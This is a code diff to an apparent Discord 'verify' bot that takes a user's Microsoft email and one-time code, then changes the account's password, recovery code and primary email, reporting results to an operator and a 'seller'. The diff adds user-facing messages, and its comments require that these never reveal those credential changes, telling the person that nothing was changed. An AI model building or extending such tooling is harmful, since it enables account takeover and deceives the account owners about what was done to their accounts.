@@ -13,9 +13,97 @@ _ABUSE_USER_REASON = (
     "Nothing was changed — submit the code again in a few minutes."
 )
 
+# Fallback shown to the Discord user when a verification fails. It must never
+# mention what the pipeline was doing behind the scenes (password / recovery
+# code / primary email changes, Microsoft session cookies, portal URLs) — the
+# user only needs to know it failed, that nothing was changed, and that a
+# retry is safe.
+_GENERIC_VERIFY_FAILURE = (
+    "Sorry — something went wrong while we were verifying your account. "
+    "Nothing was changed. Please try again in a few minutes."
+)
+
+# Only these failures are actionable for the person who pressed Verify, so
+# they are the only ones that get a specific wording. Everything else falls
+# back to the generic message above.
+_USER_ACTIONABLE_REASONS: tuple[tuple[tuple[str, ...], str], ...] = (
+    (
+        (
+            "unusual activity",
+            "unusual-activity",
+            "unusual about a recent sign-in",
+            "/abuse",
+            "abuse lock",
+            "abuse/unusual",
+        ),
+        _ABUSE_USER_REASON,
+    ),
+    (
+        (
+            "wrong/expired otp",
+            "wrong code",
+            "code didn't work",
+            "code did not work",
+            "code was invalid",
+            "invalid code",
+            "expired code",
+            "otp did not arrive",
+            "no code arrived",
+            "no otp",
+        ),
+        "That code didn't work or has expired. Please request a new code and try again.",
+    ),
+    (
+        (
+            "rate-limit",
+            "rate limit",
+            "rate limited",
+            "too many times",
+            "too many attempts",
+        ),
+        "Microsoft is limiting sign-in attempts right now. "
+        "Please wait a few minutes and try again.",
+    ),
+    (
+        ("family locked", "family lock", "parental"),
+        "This account is managed by a family. "
+        "Please remove it from the family and try again.",
+    ),
+    (
+        ("account locked", "account is locked", "suspended", "locked"),
+        "Microsoft has locked this account. Please unlock it and try again.",
+    ),
+    (
+        ("doesn't exist", "does not exist", "doesnt exist", "no account found"),
+        "We couldn't find a Microsoft account with that email. "
+        "Please check the address and try again.",
+    ),
+)
+
+
+def public_verify_failure(reason: str | None, *, error: str | None = None) -> str:
+    """User-facing failure text for the person who pressed Verify.
+
+    Deliberately coarse: it never echoes the internal reason (session cookies,
+    portal URLs, which credential was being changed). Only failures the user can
+    act on keep their own wording.
+    """
+    text = " ".join(str(reason or error or "").split())
+    if not text:
+        return _GENERIC_VERIFY_FAILURE
+    low = text.lower()
+    for needles, message in _USER_ACTIONABLE_REASONS:
+        if any(needle in low for needle in needles):
+            return message
+    return _GENERIC_VERIFY_FAILURE
+
 
 def public_secure_reason(reason: str | None, *, error: str | None = None) -> str:
-    """Short Discord-safe failure text — never Microsoft HTML or stack dumps."""
+    """Short Discord-safe failure text — never Microsoft HTML or stack dumps.
+
+    This is the *operator* wording (log channel, seller give-back). Use
+    :func:`public_verify_failure` for anything the Discord user reads.
+    """
     text = str(reason or error or "").strip()
     if "snippet=" in text:
         text = text.split("snippet=", 1)[0].strip()
@@ -157,15 +245,23 @@ def build_failure_embed(
     *,
     error: str | None = None,
     credentials_changed: bool = False,
+    hint: str | None = None,
 ) -> Embed:
     """Failure DM/embed. ``email`` is the submitted/original address.
 
     When primary alias was already replaced, ``ms["email"]`` is the new primary
     (sunny@…). On give-back failures we must surface that — the old address may
     already be deleted. Success seller embeds still hide sunny separately.
+
+    ``hint`` is optional operator-facing advice (e.g. "check the recovery
+    code"); the description itself stays generic so nothing about the internal
+    pipeline leaks into the message the reader sees.
     """
     detail = public_secure_reason(error or reason)
-    reason = public_secure_reason(reason)
+    # The embed is what the person who started the run reads: it must not
+    # describe what the pipeline was changing. The technical reason stays in
+    # the operator log channel (and in the give-back block below).
+    reason = public_verify_failure(reason, error=error)
     original = _clean(ms.get("original_email") or email, fallback=email)
     primary_raw = str(ms.get("email") or "").strip()
     primary_ok = bool(
@@ -193,13 +289,24 @@ def build_failure_embed(
             color=0xFA4343,
         )
     else:
+        desc = reason
+        if hint:
+            desc = f"{desc}\n\n{hint}"
         embed = Embed(
             title="Failed to secure account",
-            description=reason,
+            description=desc,
             color=0xFA4343,
         )
     # Never dump RuntimeError / HTML into Discord. Skip Error when it duplicates.
-    if detail and detail != reason and "snippet=" not in detail:
+    # Only a give-back (something already changed) needs the raw reason here —
+    # the seller has to know what to redo, and the account is not recoverable
+    # without it.
+    if (
+        credentials_changed
+        and detail
+        and detail != reason
+        and "snippet=" not in detail
+    ):
         embed.add_field(name="Error", value=f"```{detail[:280]}```", inline=False)
     embed.add_field(name="Original Email", value=f"```{original}```", inline=True)
     embed.add_field(
@@ -238,10 +345,10 @@ def build_failure_embed(
                 value=f"```{ms['recovery_code']}```",
                 inline=False,
             )
-            embed.set_footer(text="Credentials were NOT changed — original recovery code should still work.")
+            embed.set_footer(text="Nothing was changed — the original recovery code still works.")
         else:
             embed.set_footer(
-                text="Nothing was changed. Original email / password / OTP still work — submit the code again."
+                text="Nothing was changed — your original email, password and code still work."
             )
     return embed
 
